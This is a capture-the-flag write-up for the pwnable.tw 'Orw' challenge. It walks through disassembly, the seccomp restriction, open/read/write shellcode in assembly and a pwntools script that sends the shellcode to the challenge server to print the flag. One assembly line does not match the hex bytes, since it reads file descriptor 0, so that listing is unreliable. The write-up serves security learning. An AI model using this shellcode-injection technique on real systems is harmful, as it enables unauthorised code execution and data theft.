# Pwnable.tw - Orw
* Website : Pwnable.tw
* Challenge : Orw
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x01
Let's use **objdump** or **r2** to disassemble the binary first :
```asm
lea    ecx,[esp+0x4]
and    esp,0xfffffff0
push   DWORD PTR [ecx-0x4]
push   ebp
mov    ebp,esp
push   ecx
sub    esp,0x4
call   0x80484cb ; <orw_seccomp>
sub    esp,0xc
push   0x80486a0 ; "Give me your shellcode:"
call   8048380 ; <printf@plt>
add    esp,0x10
sub    esp,0x4
push   0xc8
push   0x804a060 ; Our input
push   0x0
call   8048370 ; <read@plt>
add    esp,0x10
mov    eax,0x804a060
call   eax
mov    eax,0x0
mov    ecx,DWORD PTR [ebp-0x4]
leave
lea    esp,[ecx-0x4]
ret
xchg   ax,ax
xchg   ax,ax
xchg   ax,ax
nop
```
This is a very simple challenge of shellcoding.

The program will call our input by the below assembly:

```asm
mov eax, 0x804a060
call eax
```
Weee! Let's send /bin/sh to the remote server and get shell !!!

Isn't it too easy? :satisfied: 

However, when we send /bin/sh to the program, we get a **SIGKILL** and exit.

Nooooo!!! :cry: 

## 0x02
Let's look back to the assembly:

```asm
call   0x80484cb ; <orw_seccomp>
```
Google it, and we will know the function **seccomp** is security mechanism of syscall.

In this challenge, we can only use **sys_open**, **sys_read**, **sys_write**.

Oh, I know it. We need to write the **asm** to **open** **/home/orw/flag** and **read** it and **write** to the **stdout**.

Okay, let's write the assembly and disassemble it to get the bytecode.


## 0x03
exp.asm:
```asm
section .text
    global _start

_start:
        ; open
        xor eax, eax ; set zero
        xor ebx, ebx ; set zero
        xor ecx, ecx ; set zero
        xor edx, edx ; set zero
        push ecx ; push \x00 to end the string
        push 0x67616c66 ; flag
        push 0x2f77726f ; orw/
        push 0x2f2f2f65 ; e///
        push 0x6d6f682f ; /hom
        mov ebx, esp ; store the path to ebx
        mov eax, 5 ; sys_open
        int 0x80 ;
        
        ; read
        mov ebx, 0 ; fd
        mov ecx, esp ; buffer
        mov edx, 0x30 ; size
        mov eax, 3 ; sys_read
        int 0x80 ;
        
        ; write
        mov ebx, 1 ; stdout
        mov eax, 4 ; sys_write
        int 0x80 ;
```

## 0x04
Exploit:
```python
from pwn import *

shellcode = '\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x51\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x65\x2F\x2F\x2F\x68\x2F\x68\x6F\x6D\x89\xE3\xB8\x05\x00\x00\x00\xCD\x80\x89\xC3\x89\xE1\xBA\x30\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x01\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80'

r = remote('chall.pwnable.tw',10001)

r.send(shellcode)

r.interactive()
```
